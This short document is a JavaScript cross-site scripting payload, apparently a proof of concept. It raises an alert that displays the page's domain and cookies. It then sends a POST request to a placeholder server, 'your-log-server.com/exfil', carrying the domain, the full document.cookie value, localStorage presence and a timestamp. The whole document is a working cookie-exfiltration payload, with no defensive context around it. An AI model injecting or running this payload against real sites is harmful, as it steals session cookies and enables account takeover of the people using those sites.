alert("XSS executed via button click!\n\n" + 
      "Domain: " + document.domain + "\n" +
      "Cookie length: " + document.cookie.length + "\n" +
      "Cookies: " + document.cookie);

fetch("https://your-log-server.com/exfil", {
  method: "POST",
  body: JSON.stringify({
    domain: document.domain,
    cookie: document.cookie,
    localStorage: Object.keys(localStorage).length > 0 ? "[present]" : "[empty]",
    timestamp: new Date().toISOString()
  }),
  headers: { "Content-Type": "application/json" }
});
